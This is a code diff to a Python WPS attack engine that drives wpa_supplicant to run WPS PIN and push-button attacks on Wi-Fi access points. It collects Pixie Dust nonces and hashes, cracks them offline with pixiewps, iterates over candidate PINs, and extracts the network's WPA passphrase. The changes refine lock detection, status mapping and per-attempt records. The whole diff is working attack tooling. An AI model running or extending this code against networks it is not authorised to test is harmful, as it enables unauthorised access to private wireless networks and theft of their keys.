@@ -31,8 +31,14 @@ class WpsEngine:
 
         # Connection state
         self.state = {
-            'status': '', 'last_m': 0, 'essid': '',
-            'bssid': '', 'wpa_psk': '', 'is_locked': False, 'pin': '',
+            'status': '',
+            'last_m': 0,
+            'essid': '',
+            'bssid': '',
+            'wpa_psk': '',
+            'is_locked': False,
+            'attempted_pin': None,
+            'verified_pin': None,
         }
 
         self.output_lines = []
@@ -171,18 +177,21 @@ class WpsEngine:
         return ''
 
     def _handle_wps_message(self, line):
-        """Parse WPS protocol messages (M1-M8, M2D, NACK)"""
+        """Parse WPS protocol messages (M1-M8, M2D, NACK, lock hints)."""
         ll = line.lower()
 
-        # M2D = AP locked
-        if 'm2d' in ll:
-            self._log('Received WPS Message M2D')
-            self.state['status'] = 'WPS_FAIL'
+        if 'ap setup locked' in ll or 'setup locked' in ll or 'wps-ap-setup-locked' in ll:
+            self.state['status'] = 'WPS_LOCKED'
             self.state['is_locked'] = True
-            self._log('AP is LOCKED (not accepting PINs)')
+            self._log('AP reports WPS setup locked')
             return False
 
-        # Building message
+        if 'm2d' in ll:
+            self._log('Received WPS Message M2D')
+            self.state['status'] = 'WPS_M2D'
+            self._log('Registrar rejected or deferred the PIN session (M2D)')
+            return False
+
         m = re.search(r'Building Message M(\d+)', line)
         if m:
             n = int(m.group(1))
@@ -190,7 +199,6 @@ class WpsEngine:
             self._log('Sending WPS Message M{n}'.format(n=n))
             return True
 
-        # Received message
         m = re.search(r'Received M(\d+)', line)
         if m:
             n = int(m.group(1))
@@ -200,17 +208,12 @@ class WpsEngine:
                 self._log('First half of PIN is VALID!')
             return True
 
-        # NACK
-        if 'received wsc_nack' in ll:
+        if 'received wsc_nack' in ll or 'wsc_nack' in ll:
             self.state['status'] = 'WSC_NACK'
             self._log('Received WSC NACK')
-            if self.state['last_m'] < 3:
-                self.state['is_locked'] = True
-                return False
-            self._log('Wrong PIN code')
-            return True
+            self._log('PIN was rejected by the registrar')
+            return False
 
-        # ═══ Pixie Dust Data Capture ═══
         if 'enrollee nonce' in ll and 'hexdump' in ll:
             self._capture_pixie('E_NONCE', line, 32)
         elif 'registrar nonce' in ll and 'hexdump' in ll:
@@ -226,9 +229,9 @@ class WpsEngine:
         elif 'e-hash2' in ll and 'hexdump' in ll:
             self._capture_pixie('E_HASH2', line, 64)
 
-        # PSK found!
         if 'network key' in ll and 'hexdump' in ll:
             self.state['status'] = 'GOT_PSK'
+            self.state['verified_pin'] = self.state.get('attempted_pin')
             hex_val = self._get_hex(line)
             try:
                 self.state['wpa_psk'] = bytes.fromhex(hex_val).decode('utf-8', errors='replace')
@@ -256,14 +259,21 @@ class WpsEngine:
         self._log('{attr}: {val}'.format(attr=attr, val=hex_val[:40] + ('...' if len(hex_val) > 40 else '')))
 
     def _handle_connection_state(self, line, pbc_mode=False):
-        """Parse connection state changes"""
+        """Parse connection state changes."""
         ll = line.lower()
+
+        if 'ap setup locked' in ll or 'setup locked' in ll or 'wps-ap-setup-locked' in ll:
+            self.state['status'] = 'WPS_LOCKED'
+            self.state['is_locked'] = True
+            self._log('AP reports WPS setup locked')
+            return False
 
         if 'state:' in ll and 'scanning' in ll:
             self.state['status'] = 'scanning'
 
         elif 'wps-fail' in ll:
-            self.state['status'] = 'WPS_FAIL'
+            if not self.state.get('status'):
+                self.state['status'] = 'WPS_FAIL'
 
         elif 'trying to authenticate' in ll:
             self.state['status'] = 'authenticating'
@@ -274,9 +284,11 @@ class WpsEngine:
 
         elif 'associated with' in ll and self.interface in ll:
             bssid = line.split()[-1].upper()
+            self.state['bssid'] = bssid
 
         elif 'wps-timeout' in ll:
             self.state['status'] = 'WPS_TIMEOUT'
+            return False
 
         elif pbc_mode and 'selected bss' in ll:
             try:
@@ -310,61 +322,59 @@ class WpsEngine:
     # ═══════════════════════════════════════════
 
     def wps_pin_attack(self, bssid, pin, timeout=60):
-        """Perform WPS PIN attack with auto-retry on timeout"""
-        attempts = 1
-        if timeout <= 30:
-            attempts = 1
-        elif timeout > 45:
-            # For long timeouts, try twice
-            attempts = 1
+        """Perform one WPS PIN attempt and return a normalized result."""
+        for key in self.pixie_data:
+            self.pixie_data[key] = ''
+        self.state = {
+            'status': '',
+            'last_m': 0,
+            'essid': '',
+            'bssid': bssid.upper(),
+            'wpa_psk': '',
+            'is_locked': False,
+            'attempted_pin': pin,
+            'verified_pin': None,
+        }
+        self.output_lines = []
+        self.pixie_data['BSSID'] = bssid.upper()
 
-        for attempt in range(1, attempts + 2):
-            # Reset state
-            for k in self.pixie_data:
-                self.pixie_data[k] = ''
-            self.state = {
-                'status': '', 'last_m': 0, 'essid': '',
-                'bssid': bssid.upper(), 'wpa_psk': '',
-                'is_locked': False, 'pin': pin,
-            }
-            self.output_lines = []
-            self.pixie_data['BSSID'] = bssid.upper()
+        cmd = 'WPS_REG {bssid} {pin}'.format(bssid=bssid, pin=pin)
+        reply = self._send_recv(cmd)
 
-            # Send WPS_REG command
-            cmd = 'WPS_REG {bssid} {pin}'.format(bssid=bssid, pin=pin)
-            reply = self._send_recv(cmd)
+        if 'OK' not in reply:
+            self.state['status'] = 'WPS_FAIL'
+            self._log('WPS_REG failed: {reply}'.format(reply=reply))
+            return self._result()
 
-            if 'OK' not in reply:
-                self.state['status'] = 'WPS_FAIL'
-                self._log('WPS_REG failed: {r}'.format(r=reply))
+        self._log('Trying PIN: {pin}'.format(pin=pin))
+
+        start_time = time.time()
+        while time.time() - start_time < timeout:
+            if not self.is_alive():
+                if not self.state.get('status'):
+                    self.state['status'] = 'WPS_FAIL'
+                break
+            line = self._read_line()
+            if not line:
+                time.sleep(0.05)
                 continue
-
-            self._log('Trying PIN: {pin} (attempt {a})'.format(pin=pin, a=attempt))
-
-            # Monitor output
-            start_time = time.time()
-            while time.time() - start_time < timeout:
-                if not self.is_alive():
-                    break
-                line = self._read_line()
-                if not line:
-                    time.sleep(0.05)  # Small sleep to avoid busy-loop
-                    continue
-                if not self._process_line(line):
-                    break
-                if self.state['status'] in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
-                    break
-
-            # Cancel WPS
-            self._send('WPS_CANCEL')
-
-            if self.state.get('status') in ('GOT_PSK', 'WSC_NACK'):
+            if not self._process_line(line):
+                break
+            if self.state['status'] in (
+                'WSC_NACK',
+                'GOT_PSK',
+                'WPS_FAIL',
+                'WPS_M2D',
+                'WPS_TIMEOUT',
+                'WPS_LOCKED',
+            ):
                 break
 
-            if attempt <= attempts:
-                self._log('Retrying...')
-                time.sleep(2)
+        if not self.state.get('status'):
+            self.state['status'] = 'WPS_TIMEOUT'
+            self._log('WPS exchange timed out')
 
+        self._send('WPS_CANCEL')
         return self._result()
 
     def wps_pbc_attack(self, bssid=None, timeout=120):
@@ -372,9 +382,14 @@ class WpsEngine:
         for k in self.pixie_data:
             self.pixie_data[k] = ''
         self.state = {
-            'status': '', 'last_m': 0, 'essid': '',
+            'status': '',
+            'last_m': 0,
+            'essid': '',
             'bssid': bssid.upper() if bssid else '',
-            'wpa_psk': '', 'is_locked': False, 'pin': 'PBC',
+            'wpa_psk': '',
+            'is_locked': False,
+            'attempted_pin': 'PBC',
+            'verified_pin': None,
         }
         self.output_lines = []
 
@@ -404,7 +419,7 @@ class WpsEngine:
         self._send('WPS_CANCEL')
         return self._result()
 
-    def collect_pixie_data(self, bssid, max_attempts=8):
+    def collect_pixie_data(self, bssid, max_attempts=8, skip_pins=None):
         """
         Collect Pixie Dust data for offline cracking.
         Tries smart PINs (from OUI analysis) first, then generic PINs.
@@ -425,8 +440,28 @@ class WpsEngine:
         except Exception:
             pass
 
+        skip_set = set(skip_pins or [])
+        filtered_pins = []
+        for candidate_pin in pins:
+            if candidate_pin in skip_set:
+                continue
+            filtered_pins.append(candidate_pin)
+        if not filtered_pins:
+            self._log('No pending PINs remain for Pixie Dust collection')
+            return {
+                'pin': None,
+                'attempted_pin': None,
+                'psk': None,
+                'status': 'completed',
+                'pixie_data': self.pixie_data.copy(),
+                'collected_count': 0,
+                'output': '\n'.join(self.output_lines),
+                'attempts': [],
+            }
+
+        attempt_records = []
         collected_count = 0
-        for i, pin in enumerate(pins[:max_attempts]):
+        for i, pin in enumerate(filtered_pins[:max_attempts]):
             # Check if we already have enough data
             if self.pixie_data.get('PKE') and self.pixie_data.get('E_HASH1'):
                 if self.pixie_data.get('AUTHKEY') or self.pixie_data.get('E_HASH2'):
@@ -437,7 +472,15 @@ class WpsEngine:
                 pin=pin, i=i+1, n=max_attempts))
 
             old_data = self.pixie_data.copy()
+            started = time.time()
             result = self.wps_pin_attack(bssid, pin, timeout=30)
+            elapsed = time.time() - started
+            attempt_records.append({
+                'pin': pin,
+                'status': result.get('status', 'unknown'),
+                'response': result.get('output', '')[-500:],
+                'duration': elapsed,
+            })
 
             # Merge data (keep old if new didn't get it)
             for key in self.pixie_data:
@@ -445,6 +488,7 @@ class WpsEngine:
                     self.pixie_data[key] = old_data[key]
 
             if self.state['status'] == 'GOT_PSK':
+                result['attempts'] = list(attempt_records)
                 return result
 
         # Count collected fields
@@ -485,8 +529,17 @@ class WpsEngine:
                             if pin and pin != '<empty>':
                                 self._log('PIXIEWPS PIN: {p}'.format(p=pin))
                                 # Verify the PIN
+                                verify_started = time.time()
                                 verify_result = self.wps_pin_attack(bssid, pin, timeout=45)
+                                verify_elapsed = time.time() - verify_started
+                                attempt_records.append({
+                                    'pin': pin,
+                                    'status': verify_result.get('status', 'unknown'),
+                                    'response': verify_result.get('output', '')[-500:],
+                                    'duration': verify_elapsed,
+                                })
                                 if verify_result.get('status') == 'success':
+                                    verify_result['attempts'] = list(attempt_records)
                                     return verify_result
                 except Exception as e:
                     self._log('pixiewps error: {e}'.format(e=str(e)))
@@ -494,18 +547,28 @@ class WpsEngine:
                 self._log('pixiewps not installed')
 
         return {
-            'pin': None, 'psk': None, 'status': 'data_collected',
+            'pin': None,
+            'attempted_pin': None,
+            'psk': None,
+            'status': 'data_collected',
             'pixie_data': self.pixie_data.copy(),
             'collected_count': collected_count,
             'output': '\n'.join(self.output_lines),
+            'attempts': attempt_records,
         }
 
     def _result(self):
-        """Build result dict"""
+        """Build a normalized result dict."""
+        status = self._map_status()
+        psk = self.state.get('wpa_psk') if status == 'success' else None
+        pin = None
+        if status == 'success' and psk:
+            pin = self.state.get('verified_pin') or self.state.get('attempted_pin')
         return {
-            'pin': self.state.get('pin'),
-            'psk': self.state.get('wpa_psk'),
-            'status': self._map_status(),
+            'pin': pin,
+            'attempted_pin': self.state.get('attempted_pin'),
+            'psk': psk,
+            'status': status,
             'pixie_data': self.pixie_data.copy(),
             'essid': self.state.get('essid'),
             'is_locked': self.state.get('is_locked'),
@@ -514,17 +577,21 @@ class WpsEngine:
         }
 
     def _map_status(self):
-        """Map internal status to result status"""
-        s = self.state['status']
-        if s == 'GOT_PSK':
+        """Map internal status to result status."""
+        status = self.state.get('status', '')
+        if status == 'GOT_PSK':
             return 'success'
-        elif s == 'WSC_NACK':
+        if status == 'WPS_M2D':
+            return 'm2d_rejected'
+        if status == 'WSC_NACK':
             return 'wrong_pin'
-        elif s == 'WPS_FAIL':
+        if status == 'WPS_LOCKED':
+            return 'locked'
+        if status == 'WPS_FAIL':
             return 'failed'
-        elif s == 'WPS_TIMEOUT':
+        if status == 'WPS_TIMEOUT':
             return 'timeout'
-        elif self.state.get('is_locked'):
+        if self.state.get('is_locked'):
             return 'locked'
         return 'completed'
 
